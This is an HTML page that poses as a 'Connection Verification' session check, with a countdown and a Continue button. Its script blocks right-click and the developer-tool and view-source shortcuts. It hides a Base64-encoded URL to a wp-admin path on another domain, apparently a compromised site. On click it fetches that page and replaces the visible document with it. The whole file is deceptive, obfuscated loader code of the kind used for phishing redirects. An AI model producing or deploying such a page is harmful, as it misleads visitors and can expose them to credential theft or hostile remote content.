<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Connection Verification</title>
<style>
body{margin:0;background:#fafafa;display:flex;justify-content:center;align-items:center;height:100vh;font-family:Arial,sans-serif;}
</style>
</head>
<body>
<div id="root"></div>

<script>
// ============================================================
//  MBROJTJA: Bllokimi i klikimit të djathtë dhe tasteve
// ============================================================
document.addEventListener('contextmenu', function(e) {
    e.preventDefault();
    return false;
});

document.addEventListener('keydown', function(e) {
    // F12
    if (e.key === 'F12' || e.keyCode === 123) {
        e.preventDefault();
        return false;
    }
    // Ctrl+U (View Source)
    if (e.ctrlKey && (e.key === 'u' || e.key === 'U' || e.keyCode === 85)) {
        e.preventDefault();
        return false;
    }
    // Ctrl+Shift+I (Inspect)
    if (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'i' || e.keyCode === 73)) {
        e.preventDefault();
        return false;
    }
    // Ctrl+S (Save)
    if (e.ctrlKey && (e.key === 's' || e.key === 'S' || e.keyCode === 83)) {
        e.preventDefault();
        return false;
    }
});

// ============================================================
//  KRIJIMI I GJITHË FAQES PËRMES JAVASCRIPT
//  (për të parandaluar View Source)
// ============================================================

// URL e fshehur në Base64
var _0xenc = [
    "aHR0cHM6Ly8=",                   // 0: "https://"
    "Ym9tYmFzcGVyZmVjdGE=",           // 1: "bombasperfecta"
    "LmFkZW1hdGljYS5jb20=",          // 2: ".adematica.com"
    "L3dwLWFkbWluL2FkbWluLw==",       // 3: "/wp-admin/admin/"
    "aW5kZXguaHRtbA=="                // 4: "index.html"
];

function _0xdec(_0xidx) {
    return atob(_0xenc[_0xidx]);
}

// Monto URL-në
var targetUrl = _0xdec(0) + _0xdec(1) + _0xdec(2) + _0xdec(3) + _0xdec(4);

// ============================================================
//  KRIJON TË GJITHË PËRMBAJTJEN HTML
// ============================================================
var htmlContent = `
<div class="container">
    <div class="top-icon">&#10003;</div>
    <h2>Connection Verification</h2>
    <div class="subtitle">Please wait while we verify your session.</div>

    <div class="circle">
        <svg width="120" height="120">
            <circle class="bg" cx="60" cy="60" r="50"></circle>
            <circle id="progress" class="progress" cx="60" cy="60" r="50"></circle>
        </svg>
        <div class="number" id="number">4</div>
    </div>

    <div class="bar">
        <div class="bar-fill" id="bar"></div>
    </div>

    <div class="status" id="status">Checking connection...</div>

    <button id="btn">Continue</button>

    <div class="footer">Protected session</div>
</div>

<style>
*{
    box-sizing:border-box;
    font-family:Arial,sans-serif;
}
body{
    margin:0;
    background:#fafafa;
    display:flex;
    justify-content:center;
    align-items:center;
    height:100vh;
}
.container{
    width:350px;
    text-align:center;
}
.top-icon{
    width:40px;
    height:40px;
    margin:auto;
    border-radius:50%;
    background:#fff4ea;
    color:#d48b39;
    font-size:22px;
    display:flex;
    align-items:center;
    justify-content:center;
}
h2{
    margin-top:20px;
    font-size:26px;
    color:#222;
}
.subtitle{
    color:#888;
    margin-top:10px;
}
.circle{
    position:relative;
    width:120px;
    height:120px;
    margin:35px auto;
}
svg{
    transform:rotate(-90deg);
}
circle{
    fill:none;
    stroke-width:5;
}
.bg{
    stroke:#e8e8e8;
}
.progress{
    stroke:#d48b39;
    stroke-linecap:round;
    stroke-dasharray:314;
    stroke-dashoffset:0;
    transition:1s linear;
}
.number{
    position:absolute;
    left:50%;
    top:50%;
    transform:translate(-50%,-50%);
    font-size:42px;
    color:#222;
    font-weight:bold;
}
.bar{
    width:180px;
    height:5px;
    background:#ececec;
    margin:auto;
    border-radius:30px;
    overflow:hidden;
}
.bar-fill{
    width:0%;
    height:100%;
    background:#d48b39;
    transition:1s;
}
.status{
    margin-top:12px;
    color:#b97724;
    font-size:14px;
}
button{
    display:none;
    margin-top:25px;
    border:none;
    background:#f59e0b;
    color:white;
    padding:13px 35px;
    border-radius:8px;
    font-size:16px;
    cursor:pointer;
}
button:hover{
    opacity:.9;
}
button:disabled{
    opacity:0.5;
    cursor:not-allowed;
}
.footer{
    margin-top:40px;
    color:#aaa;
    font-size:12px;
}
</style>
`;

// Fut përmbajtjen në faqe
document.getElementById('root').innerHTML = htmlContent;

// ============================================================
//  LOGJIKA E NUMËRIMIT DHE BUTONIT
// ============================================================
let total = 4;
let current = 4;
const circumference = 314;
const progress = document.getElementById("progress");
const number = document.getElementById("number");
const bar = document.getElementById("bar");
const status = document.getElementById("status");
const btn = document.getElementById("btn");

function update() {
    let percent = (total - current) / total;
    progress.style.strokeDashoffset = circumference - (circumference * percent);
    bar.style.width = (percent * 100) + "%";
    number.innerHTML = current;
    current--;
    if (current < 0) {
        clearInterval(timer);
        number.innerHTML = "&#10003;";
        progress.style.strokeDashoffset = 0;
        bar.style.width = "100%";
        status.innerHTML = "Verification completed";
        status.style.color = "#16a34a";
        btn.style.display = "inline-block";
    }
}
update();
const timer = setInterval(update, 1000);

btn.onclick = async function() {
    btn.disabled = true;
    btn.textContent = "Loading...";
    try {
        const response = await fetch(targetUrl);
        if (!response.ok) throw new Error("HTTP " + response.status);
        const htmlContent = await response.text();
        document.open();
        document.write(htmlContent);
        document.close();
    } catch (err) {
        console.error("Fetch failed:", err);
        alert("Could not load the target page. Please try again.");
        btn.disabled = false;
        btn.textContent = "Continue";
    }
};
</script>
</body>
</html>
